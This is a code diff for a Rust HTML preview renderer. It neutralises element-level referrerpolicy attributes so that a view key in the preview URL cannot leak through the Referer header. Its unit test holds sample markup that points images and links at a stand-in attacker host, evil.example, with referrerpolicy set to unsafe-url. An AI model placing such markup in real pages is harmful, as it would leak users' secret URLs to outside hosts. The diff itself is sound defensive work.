@@ -188,8 +188,12 @@ const FILTERED_TAGS: [&str; 12] = [
 /// Applies [`filter_tags`] to a raw HTML node; other nodes are left alone.
 fn filter_raw_html<'a>(node: &'a AstNode<'a>) {
     match node.data_mut().value {
-        NodeValue::HtmlBlock(ref mut block) => block.literal = filter_tags(&block.literal),
-        NodeValue::HtmlInline(ref mut literal) => *literal = filter_tags(literal),
+        NodeValue::HtmlBlock(ref mut block) => {
+            block.literal = disarm_referrer_policy(&filter_tags(&block.literal));
+        }
+        NodeValue::HtmlInline(ref mut literal) => {
+            *literal = disarm_referrer_policy(&filter_tags(literal));
+        }
         _ => {}
     }
 }
@@ -209,6 +213,32 @@ fn filter_tags(html: &str) -> String {
             out.push('<');
         }
         rest = after;
+    }
+    out.push_str(rest);
+    out
+}
+
+/// The attribute that lets an element choose its own referrer policy.
+const REFERRER_POLICY: &str = "referrerpolicy";
+
+/// Renames every `referrerpolicy` in raw HTML to `data-referrerpolicy`. The
+/// preview's URL carries the server's view key, and the page's `no-referrer`
+/// policy is what keeps it out of the Referer of a remote badge or a followed
+/// link; an element's own `referrerpolicy="unsafe-url"` would override that.
+/// An attribute name cannot be written with character references, so a
+/// literal match finds every spelling of it. The word in raw HTML text, which
+/// is rare, gets the prefix too.
+fn disarm_referrer_policy(html: &str) -> String {
+    let mut out = String::with_capacity(html.len());
+    let mut rest = html;
+    while let Some(at) = rest.char_indices().map(|(i, _)| i).find(|&i| {
+        rest.get(i..i + REFERRER_POLICY.len())
+            .is_some_and(|word| word.eq_ignore_ascii_case(REFERRER_POLICY))
+    }) {
+        out.push_str(&rest[..at]);
+        out.push_str("data-");
+        out.push_str(&rest[at..at + REFERRER_POLICY.len()]);
+        rest = &rest[at + REFERRER_POLICY.len()..];
     }
     out.push_str(rest);
     out
@@ -409,6 +439,27 @@ mod tests {
         assert!(html.contains("&lt;BASE href"));
         assert!(html.contains("a &lt;link rel"));
         assert!(html.contains("&lt;/script>"));
+    }
+
+    #[test]
+    fn raw_html_cannot_choose_its_referrer_policy() {
+        let html = render_plain(
+            "<img src=\"https://evil.example/x.png\" referrerpolicy=\"unsafe-url\">\n\n\
+             a <a href=\"https://evil.example/\" ReferrerPolicy=unsafe-url>x</a> b\n",
+        )
+        .html;
+        assert!(
+            html.contains(
+                r#"<img src="https://evil.example/x.png" data-referrerpolicy="unsafe-url">"#
+            ),
+            "{html}"
+        );
+        assert!(html.contains("data-ReferrerPolicy=unsafe-url"), "{html}");
+        assert_eq!(
+            disarm_referrer_policy("é REFERRERPOLICY"),
+            "é data-REFERRERPOLICY"
+        );
+        assert_eq!(disarm_referrer_policy("referrer"), "referrer");
     }
 
     #[test]
